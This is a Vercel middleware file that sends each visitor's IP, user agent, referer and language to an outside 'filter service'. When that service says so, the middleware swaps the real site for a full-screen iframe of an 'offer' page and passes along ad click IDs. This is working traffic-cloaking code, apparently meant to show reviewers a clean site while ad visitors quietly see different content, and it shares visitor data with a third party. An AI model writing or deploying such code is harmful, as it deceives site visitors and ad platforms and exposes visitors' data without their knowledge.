import { ipAddress, next } from '@vercel/functions'

const FILTER_URL = 'https://filter-service-kappa.vercel.app'
const SITE_ID = '0b6fc8cc-e14e-4c30-b4ab-d41908ac80b5'

function escapeAttr(s: string) {
  return s.replace(/&/g, '&amp;').replace(/"/g, '&quot;')
}

export default async function middleware(request: Request) {
  const reqUrl = new URL(request.url)
  const { pathname } = reqUrl

  if (/^\/(api|_next|assets)\b/.test(pathname)) return next()

  const last = pathname.split('/').filter(Boolean).pop() ?? ''
  if (last.includes('.')) return next()

  const xff = request.headers.get('x-forwarded-for')
  const ip = (ipAddress(request) ?? xff?.split(',')[0]?.trim()) || ''

  try {
    const res = await fetch(`${FILTER_URL}/api/check`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        sid: SITE_ID,
        ip,
        ua: request.headers.get('user-agent') ?? '',
        ref: request.headers.get('referer') ?? '',
        lang: request.headers.get('accept-language') ?? '',
      }),
      signal: AbortSignal.timeout(2000),
    })
    if (res.ok) {
      const data = (await res.json()) as { action?: string; url?: string }
      if (data.action === 'redirect' && data.url) {
        const utms = new URLSearchParams()
        reqUrl.searchParams.forEach((v, k) => {
          if (
            k.startsWith('utm_') ||
            ['fbclid', 'gclid', 'ttclid', 'twclid', 'msclkid', 'click_id'].includes(k)
          ) {
            utms.set(k, v)
          }
        })
        const utmStr = utms.toString()
        const offerUrl = utmStr
          ? data.url + (data.url.includes('?') ? '&' : '?') + utmStr
          : data.url
        const safeSrc = escapeAttr(offerUrl)
        const html = `<!DOCTYPE html><html style="margin:0;padding:0;overflow:hidden"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head><body style="margin:0;padding:0;overflow:hidden"><iframe src="${safeSrc}" style="position:fixed;top:0;left:0;width:100%;height:100%;border:0" allowfullscreen></iframe></body></html>`
        return new Response(html, {
          headers: { 'Content-Type': 'text/html; charset=utf-8' },
        })
      }
    }
  } catch {
    /* filter недоступен — отдаём приложение */
  }

  return next()
}

export const config = {
  matcher: ['/((?!api|_next|assets|favicon).*)'],
}
